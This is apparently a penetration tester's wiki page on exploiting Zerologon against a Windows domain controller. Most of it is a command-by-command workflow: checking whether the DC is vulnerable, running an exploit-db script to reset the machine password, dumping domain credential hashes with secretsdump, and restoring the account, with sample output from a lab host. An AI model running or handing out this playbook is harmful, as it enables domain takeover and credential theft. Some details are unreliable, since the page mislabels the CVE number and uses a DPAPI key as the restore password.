---
title: Zerologon
date: M11-02-2022
author: i4
---

# Zerologon

## Information - CVE-2021-1472
- Release: 11.05.2020

Be aware: Zerologon resets the Computer account!

> By forging an authentication token for specific Netlogon functionality, he was able to call a function to set the computer password of the Domain Controller to a known value. After that, the attacker can use this new password to take control over the domain controller and steal credentials of a domain admin.
> The vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf.

### POC
![CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

### searchsploit
```
searchsploit -m 49071
```

#### Workflow
**NOTE** - Exploitation will break the DC until restored, recommended guidelines:

1. Check the DC - usually ~300 attempts, use the NETBIOS name not the FQDN:
  `cve-2020-1472.py -do check -target <NETBIOS NAME> -ip <IP>`
2. Exploit the DC - this will break the DC until restored:
  `cve-2020-1472.py -do exploit <NETBIOS NAME> -ip <IP>`
3. Dump the DC - for the DA hashes, this will not contain the machine hex-pass:
  `secretsdump.py -just-dc -no-pass <NETBIOS NAME>\$@<IP>`
4. Dump the DC again - use the DA hash to get the machines hex-pass:
  `secretsdump.py -no-pass -hashes <LMHASH>:<NTHASH> <DOMAIN>/<ADMIN>@<IP>`
5. Restore target - this fixes the DC:
  `cve-2020-1472.py -do restore -target <NETBIOS NAME> -ip <IP> -hex <HEXPASS>`

## Usage
NETBIOS name of the DC
`nbtscan -r {ip}`

![](/images/w/Zerologon/nbtscan.png)

**NOTE** - Use virtualvenv for different dependencies to not clog up the system
```
python3 -m venv impkt
source impkt/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

### Check if host is vulnerable
```
$ python3 ./49071.py -do check -target CASTER -ip 10.0.0.135
...
[+] attempt x
...
$ [+] successfully authenticated
```

### Run Exploit
```
$ python3 ./49071.py -do exploit -target CASTER -ip 10.0.0.135
```

![](/images/w/Zerologon/zerologon-exploit.PNG)

### DUMP 
*NOTE* - Use `secretsdump.py` from SecureAuth Corporation as we need to connect with the computer credentials

```
$ secretsdump.py -just-dc -no-pass CASTER\$@10.0.0.135
```

![](/images/w/Zerologon/zerologon_explosion.PNG)

### Dumping machine Hex-pass
Now that we have the hashes of all the accounts, we can use the DA account to dump the NL$KM hash.

**NOTE** - NL$KM: secret key is used to encrypt cached domain passwords

```
$ secretsdump.py -no-pass -hashes aad3b435b55194eeaad3b435b51404ee:6be7a5f1051e16965eb1626fb26c8c87 MOON\Administrator@10.0.0.135
```

![](/images/w/Zerologon/zerologon-harder.PNG)


### Restore
In the last execution we got the following output:
```
[#] DPAPI_SYSTEM
dpapi_machinekey: 0xcd752fe8145175f42bf6fc4958d28d34efe8f8f7
```

This key will now be used to fix the system.

```
python3 ./49071.py -do restore -target CASTER -ip 10.0.0.135 -hex cd752fe8145175f42bf6fc4958d28d34efe8f8f7
```

Note the missing `0x`

If you've forgotten to write down the hex-key
you are still able to restore the device if you run the following command on it:
```
netdom resetpwd /server:10.0.0.135 /userd:moon.type\administrator /password:whatever
```

